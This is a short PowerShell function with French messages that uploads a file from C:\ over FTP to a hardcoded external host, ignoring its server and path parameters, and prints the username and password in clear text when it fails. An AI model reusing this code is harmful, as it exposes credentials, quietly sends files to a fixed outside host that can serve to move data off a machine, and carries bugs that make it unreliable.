function ftp-upload {
    param (
        [string]$ftpServer,
        [string]$remotePath,
        [string]$ftpUsername,
        [string]$ftpPassword,
        [string]$fileupload
    )

    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
        
        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $fileupload, "c:\" + $fileupload)

        Write-Host "Le fichier a été uploadé avec succès."
    }
    catch {
        Write-Host "Chemin de fileupload : $fileupload"
        Write-Host "login et pass  : $ftpUsername $ftpPassword"
        Write-Host "Erreur lors de l'upload du fichier : $_.Exception.Message"
    }
    finally {
        $webClient.Dispose()
    }
}
